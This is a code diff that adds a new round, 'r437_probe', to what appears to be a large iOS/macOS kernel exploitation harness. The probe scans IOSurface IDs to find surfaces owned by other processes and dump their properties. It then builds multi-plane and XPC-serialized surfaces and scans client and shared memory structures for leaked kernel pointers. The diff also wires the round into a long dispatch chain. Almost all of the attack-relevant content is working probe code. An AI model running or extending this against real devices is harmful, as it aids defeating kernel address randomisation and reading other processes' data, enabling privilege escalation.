@@ -16788,6 +16788,325 @@ static void *r436_monitor_thread(void *arg) {
     return NULL;
 }
 
+static void r437_probe(void) {
+    rlog("\n=== r437: System Surface Scan + Multi-Plane + XPC Serialize ===\n\n");
+    fflush(stdout);
+
+    /* Vector A: Scan ALL surface IDs 1-500 for system surfaces */
+    rlog("  --- Vector A: System surface ID scan (1-500) ---\n");
+    {
+        /* First create our own surface to know our ID range */
+        int aw = 32, ah = 32, abr = 128, aa = 4096, apf = 0x42475241;
+        CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFNumberRef an[5];
+        an[0] = CFNumberCreate(NULL, kCFNumberIntType, &aw);
+        an[1] = CFNumberCreate(NULL, kCFNumberIntType, &ah);
+        an[2] = CFNumberCreate(NULL, kCFNumberIntType, &abr);
+        an[3] = CFNumberCreate(NULL, kCFNumberIntType, &aa);
+        an[4] = CFNumberCreate(NULL, kCFNumberIntType, &apf);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), an[0]);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), an[1]);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerRow"), an[2]);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceAllocSize"), an[3]);
+        CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), an[4]);
+        IOSurfaceRef asurf = IOSurfaceCreate(sp);
+        CFRelease(sp);
+        for (int i = 0; i < 5; i++) CFRelease(an[i]);
+
+        uint32_t our_id = asurf ? IOSurfaceGetID(asurf) : 0;
+        rlog("    Our surface ID: %u\n", our_id);
+
+        int found_total = 0;
+        for (uint32_t probe = 1; probe <= 500; probe++) {
+            if (probe == our_id) continue;
+            IOSurfaceRef other = IOSurfaceLookup(probe);
+            if (other) {
+                found_total++;
+                rlog("    ID %u: FOUND %p\n", probe, other);
+
+                /* Get properties */
+                CFDictionaryRef allP = IOSurfaceCopyAllValues(other);
+                if (allP) {
+                    CFIndex pcnt = CFDictionaryGetCount(allP);
+                    rlog("      Properties: %ld keys\n", (long)pcnt);
+                    if (pcnt > 0 && pcnt < 20) {
+                        /* Dump key names */
+                        CFStringRef *keys = malloc(pcnt * sizeof(CFStringRef));
+                        CFDictionaryGetKeysAndValues(allP, (const void**)keys, NULL);
+                        for (CFIndex k = 0; k < pcnt; k++) {
+                            char kbuf[128] = {0};
+                            CFStringGetCString(keys[k], kbuf, sizeof(kbuf), kCFStringEncodingUTF8);
+                            rlog("        key: '%s'\n", kbuf);
+                        }
+                        free(keys);
+                    }
+                    CFRelease(allP);
+                }
+
+                /* Check surface dimensions/pixel format */
+                rlog("      W=%zu H=%zu BPR=%zu Alloc=%zu PF=0x%x Planes=%zu\n",
+                     IOSurfaceGetWidth(other), IOSurfaceGetHeight(other),
+                     IOSurfaceGetBytesPerRow(other), IOSurfaceGetAllocSize(other),
+                     (unsigned)IOSurfaceGetPixelFormat(other),
+                     IOSurfaceGetPlaneCount(other));
+
+                /* Scan client struct for kernel pointers */
+                uint64_t *op = (uint64_t*)other;
+                for (int j = 0; j < 56; j++) {
+                    if ((op[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                        rlog("      *** KPTR at client+%d: 0x%016llx ***\n",
+                             j*8, (unsigned long long)op[j]);
+                    }
+                }
+
+                /* Scan shared data for kernel pointers */
+                void *shrp = *(void**)((char*)other + 8);
+                if (shrp) {
+                    uint64_t *sq = (uint64_t*)shrp;
+                    for (int j = 0; j < 20; j++) {
+                        if ((sq[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                            rlog("      *** KPTR at shared+%d: 0x%016llx ***\n",
+                                 j*8, (unsigned long long)sq[j]);
+                        }
+                    }
+                }
+
+                CFRelease(other);
+                if (found_total >= 20) {
+                    rlog("    (capped at 20 results)\n");
+                    break;
+                }
+            }
+        }
+        rlog("    Total found: %d / 500 scanned\n", found_total);
+
+        if (asurf) CFRelease(asurf);
+    }
+    fflush(stdout);
+
+    /* Vector B: Multi-plane YCbCr surface — extra kernel metadata? */
+    rlog("\n  --- Vector B: Multi-plane YCbCr surface ---\n");
+    {
+        /* Create a 2-plane NV12 surface (420v = '420v' = 0x34323076) */
+        int bw = 64, bh = 64;
+        int bpf = 0x34323076; /* '420v' NV12 */
+
+        CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFNumberRef bwn = CFNumberCreate(NULL, kCFNumberIntType, &bw);
+        CFNumberRef bhn = CFNumberCreate(NULL, kCFNumberIntType, &bh);
+        CFNumberRef bpfn = CFNumberCreate(NULL, kCFNumberIntType, &bpf);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), bwn);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), bhn);
+        CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), bpfn);
+        CFRelease(bwn); CFRelease(bhn); CFRelease(bpfn);
+
+        /* Plane info array */
+        CFMutableArrayRef planes = CFArrayCreateMutable(NULL, 0, &kCFTypeArrayCallBacks);
+
+        /* Plane 0: Y plane (64x64, 1 byte per element) */
+        CFMutableDictionaryRef p0 = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int p0w = 64, p0h = 64, p0bpr = 64, p0bpe = 1;
+        CFNumberRef p0wn = CFNumberCreate(NULL, kCFNumberIntType, &p0w);
+        CFNumberRef p0hn = CFNumberCreate(NULL, kCFNumberIntType, &p0h);
+        CFNumberRef p0bn = CFNumberCreate(NULL, kCFNumberIntType, &p0bpr);
+        CFNumberRef p0en = CFNumberCreate(NULL, kCFNumberIntType, &p0bpe);
+        CFDictionarySetValue(p0, CFSTR("IOSurfacePlaneWidth"), p0wn);
+        CFDictionarySetValue(p0, CFSTR("IOSurfacePlaneHeight"), p0hn);
+        CFDictionarySetValue(p0, CFSTR("IOSurfacePlaneBytesPerRow"), p0bn);
+        CFDictionarySetValue(p0, CFSTR("IOSurfacePlaneBytesPerElement"), p0en);
+        CFRelease(p0wn); CFRelease(p0hn); CFRelease(p0bn); CFRelease(p0en);
+        CFArrayAppendValue(planes, p0); CFRelease(p0);
+
+        /* Plane 1: CbCr plane (32x32, 2 bytes per element) */
+        CFMutableDictionaryRef p1 = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int p1w = 32, p1h = 32, p1bpr = 64, p1bpe = 2;
+        CFNumberRef p1wn = CFNumberCreate(NULL, kCFNumberIntType, &p1w);
+        CFNumberRef p1hn = CFNumberCreate(NULL, kCFNumberIntType, &p1h);
+        CFNumberRef p1bn = CFNumberCreate(NULL, kCFNumberIntType, &p1bpr);
+        CFNumberRef p1en = CFNumberCreate(NULL, kCFNumberIntType, &p1bpe);
+        CFDictionarySetValue(p1, CFSTR("IOSurfacePlaneWidth"), p1wn);
+        CFDictionarySetValue(p1, CFSTR("IOSurfacePlaneHeight"), p1hn);
+        CFDictionarySetValue(p1, CFSTR("IOSurfacePlaneBytesPerRow"), p1bn);
+        CFDictionarySetValue(p1, CFSTR("IOSurfacePlaneBytesPerElement"), p1en);
+        CFRelease(p1wn); CFRelease(p1hn); CFRelease(p1bn); CFRelease(p1en);
+        CFArrayAppendValue(planes, p1); CFRelease(p1);
+
+        CFDictionarySetValue(sp, CFSTR("IOSurfacePlaneInfo"), planes);
+        CFRelease(planes);
+
+        IOSurfaceRef bsurf = IOSurfaceCreate(sp);
+        CFRelease(sp);
+
+        if (bsurf) {
+            rlog("    NV12 surface: id=%u planes=%zu alloc=%zu\n",
+                 IOSurfaceGetID(bsurf), IOSurfaceGetPlaneCount(bsurf),
+                 IOSurfaceGetAllocSize(bsurf));
+
+            for (size_t pi = 0; pi < IOSurfaceGetPlaneCount(bsurf); pi++) {
+                rlog("    Plane %zu: W=%zu H=%zu BPR=%zu base=%p\n",
+                     pi, IOSurfaceGetWidthOfPlane(bsurf, pi),
+                     IOSurfaceGetHeightOfPlane(bsurf, pi),
+                     IOSurfaceGetBytesPerRowOfPlane(bsurf, pi),
+                     IOSurfaceGetBaseAddressOfPlane(bsurf, pi));
+            }
+
+            /* Dump full shared data — multi-plane surfaces have more populated fields */
+            void *shrp = *(void**)((char*)bsurf + 8);
+            if (shrp) {
+                uint64_t *sq = (uint64_t*)shrp;
+                rlog("    Multi-plane shared data (256 bytes):\n");
+                int kptr_cnt = 0;
+                for (int i = 0; i < 32; i++) {
+                    if (sq[i] != 0) {
+                        rlog("      +%d: 0x%016llx", i*8, (unsigned long long)sq[i]);
+                        if ((sq[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                            rlog(" *** KPTR ***");
+                            kptr_cnt++;
+                        }
+                        rlog("\n");
+                    }
+                }
+                rlog("    KPTRs found: %d\n", kptr_cnt);
+            }
+
+            /* Also dump the IOSurfaceClientRef (448 bytes) */
+            uint64_t *bp = (uint64_t*)bsurf;
+            rlog("    Multi-plane client ref scan:\n");
+            for (int i = 0; i < 56; i++) {
+                if ((bp[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                    rlog("      *** KPTR at +%d: 0x%016llx ***\n", i*8, (unsigned long long)bp[i]);
+                }
+            }
+
+            CFRelease(bsurf);
+        } else {
+            rlog("    Failed to create NV12 surface\n");
+        }
+    }
+    fflush(stdout);
+
+    /* Vector C: IOSurfaceCreateXPCObject — serialize and inspect */
+    rlog("\n  --- Vector C: IOSurface XPC serialization ---\n");
+    {
+        /* IOSurfaceCreateXPCObject is available via dlsym */
+        typedef void* (*XPCCreateFn)(IOSurfaceRef);
+        typedef IOSurfaceRef (*XPCLookupFn)(void*);
+        XPCCreateFn xpcCreate = (XPCCreateFn)dlsym(RTLD_DEFAULT, "IOSurfaceCreateXPCObject");
+        XPCLookupFn xpcLookup = (XPCLookupFn)dlsym(RTLD_DEFAULT, "IOSurfaceLookupFromXPCObject");
+        rlog("    IOSurfaceCreateXPCObject: %p\n", xpcCreate);
+        rlog("    IOSurfaceLookupFromXPCObject: %p\n", xpcLookup);
+
+        if (xpcCreate && xpcLookup) {
+            int cw = 32, ch = 32, cbr = 128, ca = 4096, cpf = 0x42475241;
+            CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFNumberRef cn[5];
+            cn[0] = CFNumberCreate(NULL, kCFNumberIntType, &cw);
+            cn[1] = CFNumberCreate(NULL, kCFNumberIntType, &ch);
+            cn[2] = CFNumberCreate(NULL, kCFNumberIntType, &cbr);
+            cn[3] = CFNumberCreate(NULL, kCFNumberIntType, &ca);
+            cn[4] = CFNumberCreate(NULL, kCFNumberIntType, &cpf);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), cn[0]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), cn[1]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerRow"), cn[2]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceAllocSize"), cn[3]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), cn[4]);
+            IOSurfaceRef csurf = IOSurfaceCreate(sp);
+            CFRelease(sp);
+            for (int i = 0; i < 5; i++) CFRelease(cn[i]);
+
+            if (csurf) {
+                IOSurfaceSetValue(csurf, CFSTR("xpc_test"), CFSTR("hello_xpc"));
+
+                void *xpcObj = xpcCreate(csurf);
+                rlog("    XPC object: %p\n", xpcObj);
+
+                if (xpcObj) {
+                    /* Look up from XPC */
+                    IOSurfaceRef fromXPC = xpcLookup(xpcObj);
+                    rlog("    From XPC: %p (orig: %p)\n", fromXPC, csurf);
+
+                    if (fromXPC) {
+                        void *xshr = *(void**)((char*)fromXPC + 8);
+                        void *oshr = *(void**)((char*)csurf + 8);
+                        rlog("    Shared: xpc=%p orig=%p same=%d\n",
+                             xshr, oshr, xshr == oshr);
+
+                        /* Scan XPC-recovered surface for kernel pointers */
+                        uint64_t *xp = (uint64_t*)fromXPC;
+                        for (int j = 0; j < 56; j++) {
+                            if ((xp[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                rlog("      *** KPTR at +%d: 0x%016llx ***\n",
+                                     j*8, (unsigned long long)xp[j]);
+                            }
+                        }
+
+                        /* Check if XPC surface has extra properties */
+                        CFDictionaryRef xallP = IOSurfaceCopyAllValues(fromXPC);
+                        if (xallP) {
+                            rlog("    XPC surface properties: %ld keys\n",
+                                 (long)CFDictionaryGetCount(xallP));
+                            CFRelease(xallP);
+                        }
+
+                        CFRelease(fromXPC);
+                    }
+                }
+
+                CFRelease(csurf);
+            }
+        }
+    }
+    fflush(stdout);
+
+    /* Vector D: Stress test — create/destroy 100 surfaces rapidly and check IDs for gaps */
+    rlog("\n  --- Vector D: Surface ID gap analysis ---\n");
+    {
+        uint32_t ids[100];
+        IOSurfaceRef surfs[100];
+        for (int i = 0; i < 100; i++) {
+            int dw = 32, dh = 32, dbr = 128, da = 4096, dpf = 0x42475241;
+            CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFNumberRef dn[5];
+            dn[0] = CFNumberCreate(NULL, kCFNumberIntType, &dw);
+            dn[1] = CFNumberCreate(NULL, kCFNumberIntType, &dh);
+            dn[2] = CFNumberCreate(NULL, kCFNumberIntType, &dbr);
+            dn[3] = CFNumberCreate(NULL, kCFNumberIntType, &da);
+            dn[4] = CFNumberCreate(NULL, kCFNumberIntType, &dpf);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), dn[0]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), dn[1]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerRow"), dn[2]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceAllocSize"), dn[3]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), dn[4]);
+            surfs[i] = IOSurfaceCreate(sp);
+            ids[i] = surfs[i] ? IOSurfaceGetID(surfs[i]) : 0;
+            CFRelease(sp);
+            for (int j = 0; j < 5; j++) CFRelease(dn[j]);
+        }
+
+        rlog("    IDs: %u to %u\n", ids[0], ids[99]);
+        int gaps = 0;
+        for (int i = 1; i < 100; i++) {
+            if (ids[i] != ids[i-1] + 1) {
+                rlog("    Gap: %u -> %u (delta %d)\n", ids[i-1], ids[i], ids[i] - ids[i-1]);
+                gaps++;
+            }
+        }
+        rlog("    Total gaps: %d (system surface creations in parallel)\n", gaps);
+
+        for (int i = 0; i < 100; i++) if (surfs[i]) CFRelease(surfs[i]);
+    }
+    fflush(stdout);
+
+    rlog("\n=== r437 complete ===\n");
+    fflush(stdout);
+}
+
 static void r436_probe(void) {
     rlog("\n=== r436: Shared Data Race + IOSurfaceRoot Selectors + Port Enum ===\n\n");
     fflush(stdout);
@@ -76286,6 +76605,12 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 440) {
+            rlog("*** rounds=440: System Surface Scan + Multi-Plane + XPC Serialize ***\n\n");
+            fflush(stdout);
+            r437_probe();
+            goto done;
+        }
         if (rounds == 439) {
             rlog("*** rounds=439: Shared Data Race + IOSurfaceRoot Selectors + Port Enum ***\n\n");
             fflush(stdout);
@@ -78946,7 +79271,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
